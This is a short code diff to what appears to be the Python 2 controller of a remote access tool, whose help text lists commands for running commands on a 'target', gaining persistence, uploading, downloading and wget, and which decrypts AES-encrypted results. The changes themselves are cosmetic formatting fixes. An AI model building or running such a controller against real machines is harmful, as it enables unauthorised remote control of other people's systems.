@@ -39,8 +39,7 @@ rekey               - Regenerate crypto key.
 run <command>       - Execute a command on the target.
 unzip <file>        - Unzip a file.
 upload <files>      - Upload files(s).
-wget <url>          - Download a file from the web.
-'''
+wget <url>          - Download a file from the web.'''
 COMMANDS = [ 'download', 'help', 'persistence', 'quit', 'rekey', 'run',
              'unzip', 'upload', 'wget' ]
 
@@ -107,7 +106,7 @@ def main():
         # results of command
         elif cmd == 'run':
             recv_data = conn.recv(4096)
-            print crypto.AES_decrypt(recv_data, DHKEY)
+            print crypto.AES_decrypt(recv_data, DHKEY).rstrip()
 
         # download a file
         elif cmd == 'download':
